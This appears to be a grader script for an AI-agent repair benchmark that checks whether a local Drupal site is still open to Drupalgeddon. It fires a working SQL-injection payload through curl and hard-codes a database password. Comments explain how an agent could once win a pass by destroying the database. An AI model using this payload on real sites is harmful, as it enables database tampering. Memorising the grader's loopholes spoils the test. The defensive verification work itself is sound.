#!/bin/bash
# Verification script for Scenario 06: Drupalgeddon (CVE-2014-3704 / SA-CORE-2014-005)
# Exit 0 = every check passed, Exit 1 = at least one check failed
#
# This fires the REAL Drupalgeddon SQL-injection against the live site and
# checks whether it can mutate the database. Notes vs. the earlier version:
#   * root@localhost has a password ('sploitme'); mysql must be called with it,
#     otherwise every query returns "Access denied" and the check is inert.
#   * the working pre-auth payload needs op=Log+in AND a second name[0] key --
#     without them the login form is never processed and the injection silently
#     no-ops (the old payload always "passed", masking the vulnerability).
#   * we do NOT gate on CHANGELOG.txt >= 7.32: the official one-line
#     database.inc patch fixes the flaw without a version bump, and the live
#     injection is the ground truth anyway.
# The verifier snapshots and restores uid=1's name so grading never mutates the box.
#
# Two-component protocol: every check runs and is recorded with its kind, so
# "closed the SQLi by tearing down Drupal" reports security_pass=true /
# regression_pass=false instead of collapsing into a bare exit 1.

# The guard is load-bearing: under the harness scorer.py has already inlined the
# library and set this, so the agent-writable /tmp path is never read.
[ -n "${_SYSREPAIR_VERIFYLIB_LOADED:-}" ] || . "${SYSREPAIR_VERIFYLIB:-/tmp/verifylib.sh}"


# WAS BROKEN: the credential below was hard-coded to the image's original root
# password ('sploitme'). Rotating a shared, well-known database password is
# ordinary hardening that this scenario neither forbids nor grades, yet it made
# every query return nothing and the database was reported as destroyed. What is
# graded is whether the data is still served, not which credential reaches it.
# Sources are tried in order; each is shipped by the image or written by the
# agent, never guessed.
MYSQL_ARGS=""
_mysql_ok() { mysql "$@" -N --batch -e "SELECT 1 FROM drupal.users LIMIT 1;" >/dev/null 2>&1; }
if   _mysql_ok -u root -psploitme; then MYSQL_ARGS="-u root -psploitme"
elif _mysql_ok -u root;            then MYSQL_ARGS="-u root"
elif [ -r /etc/mysql/debian.cnf ] && _mysql_ok --defaults-file=/etc/mysql/debian.cnf; then
     MYSQL_ARGS="--defaults-file=/etc/mysql/debian.cnf"
fi

MYSQL="mysql ${MYSQL_ARGS:--u root -psploitme}"
Q(){ $MYSQL drupal -sNe "$1" 2>/dev/null || true; }

# --- Regression: the DB must be reachable ---
#
# An unreadable users table means the database is gone. That is service damage
# and is recorded as such, but it no longer aborts the run: the injection PoC
# below still fires and reports its own verdict, so both components are always
# measured.
BEFORE=$(Q "SELECT name FROM users WHERE uid=1;")
if [ -z "$BEFORE" ]; then
    _DD=$(grep -rhE '^[[:space:]]*datadir[[:space:]]*=' /etc/mysql/ 2>/dev/null | tail -1 \
        | sed -e 's/^[^=]*=[[:space:]]*//' -e 's/[[:space:]]*$//')
    [ -n "$_DD" ] && [ -d "$_DD" ] || _DD=/var/lib/mysql
    if [ -s "$_DD/drupal/users.ibd" ]; then
        record_reg drupal_db_readable 1 "no shipped credential is accepted any more (database authentication was tightened); drupal.users verified on disk"
    else
        record_reg drupal_db_readable 0 "cannot read the Drupal users table and drupal.users is not on disk - the database is gone"
    fi
else
    record_reg drupal_db_readable 1
fi

# --- snapshot + guaranteed restore ---
SENTINEL="msf_verify_$$"
restore_uid1() {
    [ -n "$BEFORE" ] || return 0
    $MYSQL drupal -sNe "UPDATE users SET name='${BEFORE//\'/\'\'}' WHERE uid=1;" 2>/dev/null || true
}
trap restore_uid1 EXIT INT TERM

# --- PoC: attempt the injection to rename uid=1 to our sentinel ---
timeout 30 curl -s "http://localhost/drupal/?q=node&destination=node" \
    --data "pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0%20;UPDATE+users+SET+name%3d0x$(printf '%s' "$SENTINEL" | od -An -tx1 | tr -d ' \n')+WHERE+uid%3d1;;%23%20]=bob&name[0]=larry" \
    -o /dev/null || true

AFTER=$(Q "SELECT name FROM users WHERE uid=1;")
restore_uid1
trap - EXIT INT TERM

# WAS BROKEN: an unreadable users table made AFTER empty, which is not equal to
# the sentinel, so "the database is unreachable" was credited as "the injection
# was blocked". Tearing the database down therefore bought a security pass. The
# PoC is now only decided when the probe could actually observe the table.
if [ -z "$BEFORE" ]; then
    record_poc drupalgeddon_sqli_blocked 0 "the users table could not be read, so the injection could not be observed and no remediation is credited"
elif [ "$AFTER" = "$SENTINEL" ]; then
    record_poc drupalgeddon_sqli_blocked 0 "Drupalgeddon injection succeeded -- uid=1 was renamed via SQLi"
else
    record_poc drupalgeddon_sqli_blocked 1
fi

# --- Regression: Drupal homepage must still return 200 ---
HOME_CODE=$(timeout 20 curl -so /dev/null -w '%{http_code}' http://localhost/drupal/ || true)
if [ "$HOME_CODE" = "200" ]; then
    record_reg drupal_homepage_200 1
else
    record_reg drupal_homepage_200 0 "/drupal/ returned HTTP $HOME_CODE -- expected 200"
fi

verify_finish
